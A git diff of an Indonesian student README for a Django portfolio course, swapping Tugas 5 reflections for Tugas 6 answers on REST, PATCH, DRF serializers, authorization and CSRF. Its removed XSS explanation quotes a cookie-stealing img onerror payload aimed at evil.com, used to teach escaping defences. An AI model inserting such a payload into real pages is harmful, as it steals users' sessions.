@@ -86,19 +86,7 @@ Halaman yang ada:
 
 Jalankan: `python manage.py test main`
 
-Ada 13 test cases yang nge-cover 3 skenario utama buat tiap view:
-
-1. URL bisa diakses dan pake template yang bener
-2. Data dari model muncul di halaman HTML kalau ada data
-3. Halaman nampilin pesan empty state kalau datanya kosong
-
-Detailnya:
-
-- MainViewTest (3 test) — ngecek `/` pake `index.html`, data semua model muncul, empty state
-- ExperienceViewTest (3 test) — ngecek `/experience/` pake `experience.html`, data experience muncul, empty state
-- TechnologiesViewTest (3 test) — ngecek `/technologies/` pake `technologies.html`, data tech stack muncul, empty state
-- ProjectsViewTest (3 test) — ngecek `/projects/` pake `projects.html`, data project muncul, empty state
-- NonexistentPageTest (1 test) — ngecek URL yang ga ada balik 404
+Ada 52 test cases 
 
 ## Fitur
 
@@ -122,51 +110,28 @@ AI tidak saya pakai buat ngehasilin seluruh aplikasi dari nol. Implementasi utam
 
 ### Strategi Prompting
 
-Untuk tugas 5 ini saya sebenarnya tidak terlalu bergantung AI karena setelah tutorial 5, banyak checkbox di tugas 5 sudah kelar jadi saya cuman finishing yg gaada di tutorial 5.
+Untuk tugas 6 ini saya sebenarnya tidak terlalu bergantung AI karena setelah tutorial 6, banyak checkbox di tugas 6 sudah kelar jadi saya cuman finishing yg gaada di tutorial 6.
 
-Tolong rapihkan jawaban saya ke dalam bentuk read.me yang rapih (sayya memberi input jawaban tugas refleksi menurut pemahamana saya lalu AI mmemberi tambahan dan sekaligus merapihkan)
+- Tolong rapihkan jawaban saya ke dalam bentuk read.me yang rapih (sayya memberi input jawaban tugas refleksi menurut pemahamana saya lalu AI mmemberi tambahan dan sekaligus merapihkan)
+- 
 
 ### Tugas Refleksi
+### Tugas 6
 
-#### 1. Debouncing pada Pencarian AJAX
+1. **Apa itu REST dan mengapa mengembalikan JSON saja belum cukup untuk menyebut API sebagai RESTful?**
+REST (Representational State Transfer) adalah arsitektur perangkat lunak untuk sistem terdistribusi yang menggunakan protokot HTTP standar. Mengembalikan JSON saja belum cukup karena API RESTful harus mematuhi semantik HTTP lengkap: menggunakan metode HTTP yang tepat (GET, POST, PUT, PATCH, DELETE), mengembalikan status kode yang sesuai (201 dibuat, 400 input salah, 403 dilarang, 404 tidak ditemukan, 204 dihapus), URL yang mengacu pada resource, dan optionally hypermedia (HATEOAS). Hanya mengirim JSON tanpa status code atau verb HTTP tepat dianggap "JSON API" tetapi tidak harus RESTful.
 
-**Debouncing** adalah teknik menunda eksekusi sebuah fungsi sampai user berhenti melakukan aksi tertentu selama jangka waktu tertentu. Daripada fungsi dipanggil di setiap event, timer di-reset tiap kali event baru datang, jadi fungsi cuma jalan sekali setelah jeda terakhir — di proyek ini jeda-nya 300 ms (`SEARCH_DEBOUNCE_DELAY` di `projects.html`).
+2. **Perbedaan PUT dan PATCH serta kapan masing-masing digunakan?**
+- **PUT**: Mengganti seluruh representasi resource. klien mengirimkan semua field resource; server mengganti entitas lama dengan yang baru. Idempotent (memanggil ulang menghasilkan sama hasil). Digunakan ketika ingin mengganti resource sepenuhnya atau memastikan semua field diperbarui.
+- **PATCH**: Modifikasi parsial resource. Menerapkan set perubahan (seperti JSON Patch/RFC 6902) pada resource yang ada. Bukan harus idempotent. Digunakan ketika hanya perlu memperbarui satu atau beberapa field tanpa mengirim seluruh resource.
 
-Teknik ini penting buat pencarian AJAX karena:
+3. **Peran serializer pada Django REST Framework dan keuntungan dibanding manual dictionary + JsonResponse**
+- Serializer menangani validasi input (tipe field, wajib diisi, metode `validate_<field>`), deserialisasi (konversi JSON masuk ke objek Python), serialisasi (model ke JSON), representasi kustom (method fields seperti `get_star_count`), error terstruktur, penolakan otomatis 400, field read-only, dan pengelolaan relasi. Membangun dictionary secara manual melewatkan validasi, repetitive, rentan kesalahan tipe data, dan tidak menangani kasus seperti stripping HTML (XSS) atau pengecualian field sensitif.
 
-- **Mengurangi jumlah request ke server.** Kalau user ngetik "portfolio website" (20 chars), tanpa debounce bisa terkirim ~20 request cuma buat 1 kata pencarian. Dengan debounce cuma 1 request setelah user berhenti ngetik.
-- **Menghemat beban server dan bandwidth.** Tiap request AJAX itu query ke database (`filter(title__icontains=...)`) plus serialisasi JSON. Request yang menumpuk bikin server kerja doang buat data yang langsung dibuang.
-- **Mencegah race condition / hasil saling tabrak.** Kalau request dikirim berurutan dan responsenya datang nggak berurutan (request lama balik lebih lambat), list bisa ketimpa sama data hasil pencarian lama. Selain debounce, di `fetchProjects()` juga ada `AbortController` buat membatalkan request sebelumnya.
-- **Respons lebih smooth.** User nggak lihat list kedip-kedip berganti tiap huruf; list baru muncul setelah input stabil.
+4. **Perbedaan autentikasi dan otorisasi pada Django REST Framework, dan harus diperiksa di server, bukan hanya di template?**
+- **Autentikasi**: Mengidentifikasi siapa pengguna (misal SessionAuthentication menggunakan cookie sesi). Menjawab "Siapa ini?"
+- **Otorisasi**: Menentukan apakah pengguna boleh melakukan aksi tersebut (misal `IsPortfolioOwnerOrEditorOrReadOnly`). Menjawab "Apakah boleh?"
+- Harus dicek di server karena template hanya pengaturan UI; pengguna bisa langsung mengakses endpoint API via curl/Postman melewati tombol yang disembunyikan. Keamanan harus ditenanggu server-side.
 
-#### 2. Fungsi `await` pada `fetch()`
-
-`fetch()` itu **asinkron**: dia langsung balikin objek `Promise` dan nggak nunggu respons server selesai. `await` bikin eksekusi fungsi `async` berhenti di titik itu sampai Promise-nya selesai (resolved), lalu nilai hasil responsnya diambil dan dipakai di baris berikutnya.
-
-```js
-const response = await fetch(url);          // berhenti sampai server jawab
-const projectData = await response.json();  // berhenti sampai body terurai jadi JSON
-```
-
-Kalau `await` nggak dipakai, `response` akan berisi **Promise**, bukan objek Respons:
-
-- `response.ok` → `undefined` (bukan `true`/`false`), jadi `if (!response.ok)` jadi salah baca.
-- `response.json()` → bakal error / balikin Promise lagi, jadi `projectData` bukan array melainkan objek Promise.
-- Kode setelah fetch jalan **sebelum data sampai** → `projectData.length === 0` bakal `undefined` sehingga selalu dianggap kosong, list nggak pernah ke-render, dan error-nya muncul di console sebagai "cannot read property of undefined".
-
-Intinya: tanpa `await`, kita pegang "janji" hasilnya, bukan hasilnya sendiri, sehingga urutan baca data jadi kacau.
-
-#### 3. Serangan XSS dan Kenapa Data AJAX Lebih Rentan
-
-**XSS (Cross-Site Scripting)** adalah serangan menyisipkan skrip berbahaya (biasanya JavaScript) ke dalam halaman web lewat input user yang nggak dibersihkan, lalu dijalankan di browser korban dengan sesi/cookie-nya. Contohnya user nyisipin `<img src=x onerror="document.location='https://evil.com/?c='+document.cookie">` ke deskripsi proyek; kalau dipasang mentah-mentah ke DOM, skripnya jalan dan cookie session bisa kecuri.
-
-Data yang dirender lewat AJAX/JavaScript **lebih rentan** daripada lewat template Django karena:
-
-- **Django template auto-escape bawaan.** Semua `{{ variable }}` otomatis di-escape jadi `&lt;script&gt;` sehingga tag nggak pernah jadi HTML. Escape ini terjadi di server, nggak bisa dilupakan.
-- **`innerHTML` nggak punya proteksi otomatis.** Kalau JavaScript nyisipin string dari JSON respons fetch pakai `innerHTML = ...`, browser langsung nge-parse string itu sebagai HTML. Satu field yang lolos aja udah cukup buat XSS.
-- **Datanya datang dari endpoint JSON yang berbeda.** Prosesnya dua tahap: server nge-serialize data → JavaScript nge-render ulang. Titik escape-nya pindah ke tangan JavaScript, jadi kewaspadaannya harus manual di tiap sisipan (`escapeHtml()` di `projects.html`) bukan otomatis kayak template.
-- **Isi JSON sering dianggap "aman".** Karena respons JSON bukan halaman HTML, developer kadang lupa bahwa isinya tetap data user yang belum tentu bersih.
-
-Makanya pertahanannya dua lapis di proyek ini: **client-side** pakai `escapeHtml()` sebelum semua nilai dimasukkan ke template literal HTML (dan `textContent` buat toast), plus **server-side** pakai `strip_tags()` di `clean_title`, `clean_role`, dan `clean_description` pada `ProjectForm` supaya tag HTML dibersihkan sebelum kesimpen di database.
-
-
+5. **Mengapa permintaan ubah data tetap memerlukan token CSRF saat API memakai SessionAuthentication, dan mengapa `force_authenticate` tidak cukup bukti perlindungan CSRF?**
+- Django memaksa token CSRF untuk POST/PUT/PATCH/DELETE untuk mencegah Cross-Site Request Forgery (request dari situs lain menggunakan sesi korban). `force_authenticate` hanya mensimulasikan pengguna autentik tetapi tidak menyertakan token CSRF yang valid di cookie/headers; server akan menolak 403 jika token hilang. Test dengan `APIClient(enforce_csrf_checks=True)` dan `.login()` membuktikan bahwa tanpa token CSRF, permintaan ditolak, menunjukkan bahwa perlindungan CSRF berjalan secara independen dari autentikasi.
